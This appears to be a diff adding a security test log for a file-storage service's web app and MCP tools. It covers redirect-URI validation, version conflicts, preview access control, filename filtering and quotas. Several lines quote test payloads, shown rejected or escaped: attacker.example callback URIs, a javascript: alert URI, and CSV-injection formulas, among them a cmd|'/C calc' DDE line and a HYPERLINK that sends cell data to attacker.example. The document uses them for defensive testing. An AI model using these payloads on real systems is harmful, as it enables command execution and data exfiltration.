@@ -1,0 +1,54 @@
+[INFO] UI-1 register 'https://attacker.example/cb' -> 400
+[INFO] UI-1 register 'http://attacker.example/cb' -> 400
+[INFO] UI-1 register 'http://localhost.attacker.example/cb' -> 400
+[INFO] UI-1 register 'http://127.0.0.1.nip.io/cb' -> 400
+[INFO] UI-1 register 'https://127.0.0.1@attacker.example/cb' -> 400
+[INFO] UI-1 register 'http://127.0.0.1:33418/callback' -> 201
+[INFO] UI-1 register 'http://[::1]:5555/cb' -> 201
+[INFO] UI-1 register 'http://LOCALHOST:1/cb' -> 201
+[INFO] UI-1 register 'javascript://localhost/%0aalert(1)' -> 400
+[INFO] UI-1 register 'http://127.0.0.1/cb#frag' -> 400
+[INFO] UI-3 /api/auth/me marketplace = 'https://git.lab.local/tools/claude-plugins.git', trash_days = 30
+[PASS] save_artifact link = http://localhost:8096/view?path=/users/maya/inbox/retest-note.md
+[PASS] if_version matching -> ok=True version=2
+[PASS] if_version stale -> ok=False conflict: /users/maya/inbox/retest-note.md changed since you opened it: it is now version 2 (saved by Maya Okafor). Open it again and reapply your change, or save under a new name.
+[PASS] after refused stale save, text='# v2\n' version=2
+[INFO] if_version=3 on a missing file -> ok=False conflict: /users/maya/inbox/never-existed.md no longer exists: it was moved, renamed or deleted after you opened it. Search for it to find where it went, or sav
+[INFO] if_version=0 -> ok=False bad_request: Argument if_version must be at least 1
+[INFO] if_version='2' (string) -> ok=False bad_request: Argument if_version must be a integer
+[INFO] stale if_version with identical content -> ok=False conflict: /users/maya/inbox/retest-note.md changed since you opened it: it is now version 2 (saved by Maya Okafor). Open it again and reappl
+[INFO] get_artifact binary (no as_base64): binary=True text=None link=True
+[PASS] get_artifact as_base64 round-trips bytes: True; has link: False; has version: 1
+[INFO] as_base64 on text file -> b'# v2\n'
+[PASS] as_base64 on another user file -> not_found: No such file or folder, or you do not have access
+[INFO] get_artifact 2.3 MB text: truncated=True len=2097152 of 2310000
+[INFO] schema save_artifact has if_version: True; get_artifact as_base64: True
+[INFO] get_artifact link: http://localhost:8096/view?path=/users/maya/inbox/retest-note.md
+[INFO] search_artifacts result keys: ['created_at', 'git_commit', 'git_remote', 'mime', 'name', 'path', 'project', 'saved_by', 'session_id', 'sha256', 'size', 'source', 'tags', 'type', 'updated_at', 'version']
+[INFO] list_folder result has link: False
+[PASS] UI-7 preview in own session -> 200
+[PASS] UI-7 preview anonymous -> 403 'Sign in to Artifact Buckets to view this file'
+[PASS] UI-7 preview from another signed-in user (jonas) -> 403
+[INFO] UI-7 preview from a second session of the same user -> 200 (user-bound, not session-bound)
+[INFO] preview headers: CSP=sandbox allow-scripts; default-src 'none'; script-src 'unsaf... XFO=SAMEORIGIN CT=text/markdown; charset=utf-8
+[PASS] UI-8 formula-leading cells in export: [] (rows=328)
+[INFO] UI-8 sample escaped cells: ['\'@SUM(1+1)*cmd|"/C calc"!A0', "'-2+3+cmd|x", '\'=HYPERLINK("http://attacker.example/?"&A1,"Click")']; leading-space cell present: True
+[INFO] UI-29 failed unknown-user signin: actor='system' via=web ip=127.0.0.1
+[INFO] UI-31 export rows (lines) = 328
+[PASS] UI-28 logout without CSRF -> 403; still signed in: True
+[PASS] UI-23 3-day token expires_in_days=3
+[INFO] UI-27 member sees 2 rules of 2; targets=['/shared/platform-eng/projects/{project}', '/shared/platform-eng/projects/{project}']; can_add=True
+[PASS] UI-17 bidi name -> ok=False bad_request: Name '‮lmth.exe' contains a character that is not allowed
+[PASS] UI-17 U+2067 name -> ok=False
+[INFO] U+200B zero-width name -> ok=False
+[INFO] CON.txt -> ok=False
+[INFO] MCP delete 60-file folder -> ok=False needs_confirmation: This folder holds 60 files. Confirm the delete in the web app.
+[PASS] web rename folder -> 200 {"from":"/users/maya/projects/bigdir","to":"/users/maya/projects/bigdir2","type"
+[INFO] web move of /users/maya/inbox (system folder) -> 403 {"error":"forbidden","message":"Home and team folders cannot be moved or renamed
+[INFO] quota user diego: quota_bytes=1048576 used=0
+[INFO] quota 1 MiB, 5 saves of 300 KiB to one file -> [(True, 1, [1]), (True, 2, [2, 1]), (True, 3, [3, 2, 1]), (True, 4, [4, 3, 2]), (True, 5, [5, 4, 3])]
+[INFO] then a new 300 KiB file -> ok=False quota_exceeded: Saving this would go over the quota for /users/diego
+[INFO] versions of q.bin after that: [5, 4, 3]
+[INFO] restore oldest kept version -> ok=True {'type': 'file', 'path': '/users/diego/inbox/q.bin', 'name': 'q.bin', 'size': 307200, 'sha256': 'a05; versions now [6, 5, 4]
+[INFO] save 1.1 MiB over a 1 MiB quota -> ok=False quota_exceeded: Saving this would go over the quota for /users/diego
+[INFO] user_info usage fields for diego: {'used_bytes': 921600, 'quota_bytes': 1048576}
